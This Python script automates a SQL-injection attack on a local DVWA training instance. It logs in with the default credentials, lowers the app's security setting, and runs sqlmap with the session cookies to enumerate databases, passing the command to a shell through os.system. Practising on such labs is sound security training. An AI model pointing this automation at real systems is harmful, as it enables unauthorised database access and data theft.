import os
import requests
from bs4 import BeautifulSoup

# URL of the DVWA application
base_url = "http://192.168.64.3/DVWA/"
login_url = base_url + "login.php"
sqli_url = base_url + "vulnerabilities/sqli/?id=1&Submit=Submit"
security_url = base_url + "security.php"

# DVWA login credentials
dvwa_username = "admin"
dvwa_password = "password"

# Function to login to DVWA and retrieve session cookies
def get_session_cookies():
    with requests.Session() as session:
        # Get initial login page to retrieve the user_token
        response = session.get(login_url)
        soup = BeautifulSoup(response.content, 'html.parser')
        user_token = soup.find('input', {'name': 'user_token'})['value']

        # Login payload
        payload = {
            'username': dvwa_username,
            'password': dvwa_password,
            'Login': 'Login',
            'user_token': user_token
        }

        # Perform login
        post_response = session.post(login_url, data=payload)

        # Check if login was successful
        if "Welcome to Damn Vulnerable Web Application" in post_response.text:
            print("Login successful.")
            cookies = session.cookies.get_dict()
            
            # Set security level to low
            set_security_level_to_low(session)
            
            # Return updated cookies
            cookies = session.cookies.get_dict()
            return cookies
        else:
            print("Login failed. Check your credentials and DVWA configuration.")
            return None

# Function to set security level to low
def set_security_level_to_low(session):
    response = session.get(security_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    
    # Find the security form and user token
    security_form = soup.find('form')
    user_token = security_form.find('input', {'name': 'user_token'})['value']
    
    # Set security level to low
    security_payload = {
        'security': 'low',
        'seclev_submit': 'Submit',
        'user_token': user_token
    }
    session.post(security_url, data=security_payload)
    print("Security level set to low.")

# Running SQLMap to detect SQL injection
def run_sqlmap(target_url, cookies):
    if cookies:
        # Prepare cookies string for SQLMap
        cookie_string = "; ".join([f"{key}={value}" for key, value in cookies.items()])
        
        # Basic SQLMap options for simple SQL injection testing
        sqlmap_command = (
            f"sqlmap -u \"{target_url}\" "
            f"--cookie=\"{cookie_string}\" "
            "--batch --level=1 --risk=1 --dbs"
        )
        print(f"Running SQLMap with command: {sqlmap_command}")
        os.system(sqlmap_command)
    else:
        print("No valid session cookies. SQLMap will not run.")

if __name__ == "__main__":
    cookies = get_session_cookies()
    run_sqlmap(sqli_url, cookies)
